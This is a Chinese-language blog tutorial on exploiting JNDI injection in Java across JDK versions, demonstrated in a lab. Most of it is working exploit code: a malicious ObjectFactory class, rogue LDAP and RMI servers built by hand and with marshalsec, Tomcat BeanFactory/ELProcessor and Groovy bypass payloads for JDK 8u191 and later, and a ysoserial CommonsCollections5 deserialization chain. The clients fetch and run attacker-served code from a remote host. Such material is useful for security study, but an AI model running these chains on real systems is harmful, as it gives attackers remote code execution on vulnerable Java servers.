> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.cnblogs.com](https://www.cnblogs.com/yyhuni/p/15088134.html)

[8u191 后的 JNDI 注入利用](https://www.cnblogs.com/yyhuni/p/8u191_jndi_inject.html)
=============================================================================

JNDI 注入版本关系图，参考如下：

[![](https://gitee.com/yyhuni/img/raw/master/img/image-20210801143159130.png)](https://gitee.com/yyhuni/img/raw/master/img/image-20210801143159130.png)

一、8u121 之前[#](#一8u121之前)
------------------------

**使用 RMI + JNDI Reference 利用**

前面文章已经讲过了 JNDI + RMI 方式，直接利用 marshalsec 发布 RMI 服务到 1099

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer  http://192.168.202.1:8000/#Evail
```

**限制版本：**JDK 6u132, JDK 7u122, JDK 8u121 以下（不包括 8u121）

在 JDK 6u132, JDK 7u122, JDK 8u121 版本开始

com.sun.jndi.rmi.object.trustURLCodebase、  
com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为 false  
即默认不允许从远程的 Codebase 加载 Reference 工厂类

二、8u191 之前[#](#二8u191之前)
------------------------

**使用 LDAP + JDNI Reference 利用方式：**

*   新建一个恶意类并发布到 http 服务器
*   启动一个 ldap 服务器
*   控制客户端 lookup() 中的 URL 为我们的恶意 LDAP 地址

此方法在版本 8u191（包括 8u191）失效

**1.1 新建一个恶意类 Evail，实现 ObjectFactory 接口：**

```
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;

public class Evail implements ObjectFactory {
    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        String commond = "gnome-calculator";
        Runtime.getRuntime().exec(commond);
        return null;
    }
}
```

注意用 idea 新建时候把自带 package 代码给去掉

**1.2 把恶意类编译成 class 文件：**

```
javac Evail.java
```

**1.3 在恶意类 class 文件目录下，使用 python 启动 http 服务发布到 8000 端口：**

[![](https://gitee.com/yyhuni/img/raw/master/img/image-20210801135727762.png)](https://gitee.com/yyhuni/img/raw/master/img/image-20210801135727762.png)

**1.4 启动服务端，把 LDAP 服务发布到 9999 端口，服务端代码：**

```
package com.yy.jndi.ldap;

import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

public class Server {
    private static final String LDAP_BASE = "dc=example,dc=com";

    public static void main(String[] argsx) {
        String[] args = new String[]{"http://192.168.202.1:8000/#Evail", "9999"};
        int port = 0;
        if (args.length < 1 || args[0].indexOf('#') < 0) {
            System.err.println(Server.class.getSimpleName() + " <codebase_url#classname> [<port>]"); //$NON-NLS-1$
            System.exit(-1);
        } else if (args.length > 1) {
            port = Integer.parseInt(args[1]);
        }

        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen", //$NON-NLS-1$
                    InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[0])));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
            ds.startListening();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;

        /**
         *
         */
        public OperationInterceptor(URL cb) {
            this.codebase = cb;
        }

        /**
         * {@inheritDoc}
         *
         * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
         */
        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            } catch (Exception e1) {
                e1.printStackTrace();
            }

        }

        protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws LDAPException, MalformedURLException {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "foo");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if (refPos > 0) {
                cbstring = cbstring.substring(0, refPos);
            }
            e.addAttribute("javaCodeBase", cbstring);
            e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
            e.addAttribute("javaFactory", this.codebase.getRef());
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }

    }
}
```

**1.5 执行客户端，访问远程 LDAP 服务器（ubuntu 作为受害机客户端，JDK 版本控制为 8u191 以下）**

```
package com.yy.jndi.ldap;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

public class Client {
    public static void main(String[] args) throws NamingException {
            String uri = "ldap://192.168.202.1:9999/Evail";
            Context ctx = new InitialContext();
            ctx.lookup(uri);
    }
}
```

**1.6 弹出计算器：**

[![](https://gitee.com/yyhuni/img/raw/master/img/image-20210801140534649.png)](https://gitee.com/yyhuni/img/raw/master/img/image-20210801140534649.png)

**※利用 marshalsec**

其实以上发布 ldap 服务端的操作可以使用 marshalsec 来快速完成：

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.202.1:8000/#Evail 9999
```

三、8u191 之后[#](#三8u191之后)
------------------------

### JNDI+RMI 的高版本绕过[#](#jndirmi的高版本绕过)

在 JDK 6u132, JDK 7u122, JDK 8u121 版本开始

com.sun.jndi.rmi.object.trustURLCodebase、  
com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为 false  
即默认不允许从远程的 Codebase 加载 Reference 工厂类

所以原本的远程加载恶意类的方式已经失效，不过并没有限制从本地进行加载类文件，比如 org.apache.naming.factory.BeanFactory

#### (1) 利用 tomcat8 的类[#](#1-利用tomcat8的类)

利用类为`org.apache.naming.factory.BeanFactory`（前提是受害机器得有 tomcat 的这个 jar 包）

> 针对 RMI 利用的检查方式中最关键的就是 if (var8 != null && var8.getFactoryClassLocation() != null && !trustURLCodebase) 如果 FactoryClassLocation 为空，那么就会进入 NamingManager.getObjectInstance 在此方法会调用 Reference 中的 ObjectFactory。因此绕过思路为在目标 classpath 中寻找实现 ObjectFactory 接口的类。在 Tomcat 中有一处可以利用的符合条件的类 org.apache.naming.factory.BeanFactory 在此类中会获取 Reference 中的 forceString 得到其中的值之后会判断是否包含等号，如果包含则用等号分割，将前一半当做方法名，后一半当做 Hashmap 中的 key。如果不包含等号则方法名变成 set 开头。值得注意的是此方法中已经指定了参数类型为 String。后面将会利用反射执行前面所提到的方法。因此需要找到使用了 String 作为参数，并且能 RCE 的方法。在 javax.el.ELProcessor 中的 eval 方法就很合适

参考：[https://bl4ck.in/tricks/2019/01/04/JNDI-Injection-Bypass.html](https://bl4ck.in/tricks/2019/01/04/JNDI-Injection-Bypass.html)

1.  无需搭建 http 服务，直接启动服务端（攻击机）代码：

```
package com.yy.jndi.jdk8u121;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import org.apache.naming.ResourceRef;

public class RMIServer {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", (String)null, "", "", true, "org.apache.naming.factory.BeanFactory", (String)null);
        resourceRef.add(new StringRefAddr("forceString", "a=eval"));
        resourceRef.add(new StringRefAddr("a", "Runtime.getRuntime().exec(\"gnome-calculator\")"));
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(resourceRef);
        registry.bind("exp", refObjWrapper);
        System.out.println("Creating evil RMI registry on port 1099");
    }
}
```

2.  使用客户端（受害机 ubuntu）进行连接即可命令执行，client 端代码:

```
package com.yy.jndi.rmi;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

public class Client {
    public static void main(String[] args) throws NamingException {
            String uri = "rmi://192.168.202.1:1099/exp";
            Context ctx = new InitialContext();
            ctx.lookup(uri);
    }
}
```

3.  执行客户端进行连接后，成功弹出计算器

[![](https://gitee.com/yyhuni/img/raw/master/img/image-20210801222753928.png)](https://gitee.com/yyhuni/img/raw/master/img/image-20210801222753928.png)

##### 总结：

适用版本：我目前测试了几个常用版本 8u102、8u121、8u191、8u202 都可以使用，可以说实用性很广了

利用前提：受害机器是 tomcat8 以上的版本，因为要 tomcat8 里面的 jar 包依赖

依赖了两个类都是 tomcat8 里面 jar 包存在的类

*   org.apache.naming.factory.BeanFactory
    
*   javax.el.ELProcessor
    

> javax.el.ELProcessor 本身是 Tomcat8 中存在的库，所以仅限 Tomcat8 及更高版本环境下可以通过 javax.el.ELProcessor 进行攻击，对于使用广泛的 SpringBoot 应用来说，可被利用的 Spring Boot Web Starter 版本应在 1.2.x 及以上，因为 1.1.x 及 1.0.x 内置的是 Tomcat7。

[![](https://gitee.com/yyhuni/img/raw/master/img/image-20210801222704637.png)](https://gitee.com/yyhuni/img/raw/master/img/image-20210801222704637.png)

#### (2) 依赖 groovy 2 以上相关类[#](#2-依赖groovy-2以上相关类)

客户端所需的 jar 包，pom.xml

```
<dependency>
            <groupId>org.codehaus.groovy</groupId>
            <artifactId>groovy</artifactId>
            <version>2.4.5</version>
        </dependency>
```

服务端代码

```
package com.yy.jndi.jdk8u121;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.NamingException;
import javax.naming.StringRefAddr;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class ExecByGroovyParse {
    public static void main(String[] args) throws NamingException, RemoteException, AlreadyBoundException {
        Registry registry = LocateRegistry.createRegistry(1099);
        ResourceRef ref = new ResourceRef("groovy.lang.GroovyClassLoader", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "x=parseClass"));
        String script = String.format("@groovy.transform.ASTTest(value={\n" +
                        "    assert java.lang.Runtime.getRuntime().exec(\"%s\")\n" +
                        "})\n" +
                        "def x\n",
//                commandGenerator.getBase64CommandTpl()
                "gnome-calculator"
        );
        ref.add(new StringRefAddr("x",script));
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(ref);
        registry.bind("exp", refObjWrapper);
        System.out.println("Creating evil RMI registry on port 1099");
    }
}
```

#### (3) 依赖 groovy 任意版本的类[#](#3-依赖groovy任意版本的类)

比如版本 1.5

```
<!-- https://mvnrepository.com/artifact/org.codehaus.groovy/groovy-all -->
		<dependency>
			<groupId>org.codehaus.groovy</groupId>
			<artifactId>groovy-all</artifactId>
			<version>1.5.0</version>
		</dependency>
```

服务端代码：

```
package com.yy.jndi.jdk8u121;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.NamingException;
import javax.naming.StringRefAddr;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class ExecByGroovy {
    public static void main(String[] args) throws NamingException, RemoteException, AlreadyBoundException {
        Registry registry = LocateRegistry.createRegistry(1099);
        ResourceRef ref = new ResourceRef("groovy.lang.GroovyShell", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "x=evaluate"));
        String script = String.format("'%s'.execute()", "gnome-calculator"); //commandGenerator.getBase64CommandTpl());
        ref.add(new StringRefAddr("x",script));
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(ref);
        registry.bind("exp", refObjWrapper);
        System.out.println("Creating evil RMI registry on port 1099");
    }
}
```

### JNDI+LDAP 高版本绕过[#](#jndildap高版本绕过)

JDK 6u211，7u201, 8u191, 11.0.1 开始  
`com.sun.jndi.ldap.object.trustURLCodebase` 属性的默认值被调整为 false，导致 LDAP 远程代码攻击方式开始失效

**利用`javaSerializedData`属性**

当 javaSerializedData 属性的`value`值不为空时，会对该值进行反序列化处理，当本地存在反序列化利用链时，即可触发。

假设目标存在一个 CC 链所需的类库，那么可以利用这点进行利用

**1. 先使用 ysoserial.jar 生成 CC 链的 poc**

```
java -jar ysoserial.jar CommonsCollections5 gnome-calculator > poc.txt
```

**2. 转换为 base64 编码后放到服务端代码里**

[![](https://gitee.com/yyhuni/img/raw/master/img/image-20210801233147201.png)](https://gitee.com/yyhuni/img/raw/master/img/image-20210801233147201.png)

服务端代码：

```
package com.yy.jndi.jdk8u191;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import com.unboundid.util.Base64;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;

public class LDAPServer {
    private static final String LDAP_BASE = "dc=example,dc=com";

    public static void main ( String[] tmp_args ) throws Exception{
        String[] args=new String[]{"http://localhost/#Evail"}; 
        int port = 6666;

        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
        config.setListenerConfigs(new InMemoryListenerConfig(
                "listen", //$NON-NLS-1$
                InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                port,
                ServerSocketFactory.getDefault(),
                SocketFactory.getDefault(),
                (SSLSocketFactory) SSLSocketFactory.getDefault()));

        config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ])));
        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
        System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
        ds.startListening();
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;

        public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }

        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }
        }

        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws Exception {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "foo");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }

            e.addAttribute("javaSerializedData", Base64.decode("base64 encode payload"));

            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }
}
```

代码的 String[] 字符串里面 ip 并不影响 payload 执行，随便填或者默认 localhost 都可

**3. 启动服务端后，客户端连接 6666 端口即可执行成功**

[![](https://gitee.com/yyhuni/img/raw/master/img/image-20210801233711364.png)](https://gitee.com/yyhuni/img/raw/master/img/image-20210801233711364.png)

参考：

[https://blog.csdn.net/caiqiiqi/article/details/105951247](https://blog.csdn.net/caiqiiqi/article/details/105951247)

[https://blog.csdn.net/caiqiiqi/article/details/105976072](https://blog.csdn.net/caiqiiqi/article/details/105976072)

[https://blog.csdn.net/weixin_44063566/article/details/88897261](https://blog.csdn.net/weixin_44063566/article/details/88897261)

[https://www.freebuf.com/articles/web/248115.html](https://www.freebuf.com/articles/web/248115.html)

[https://www.freebuf.com/vuls/253545.html](https://www.freebuf.com/vuls/253545.html)

[https://mp.weixin.qq.com/s/0LePKo8k7HDIjk9ci8dQtA](https://mp.weixin.qq.com/s/0LePKo8k7HDIjk9ci8dQtA)

[https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html](https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html)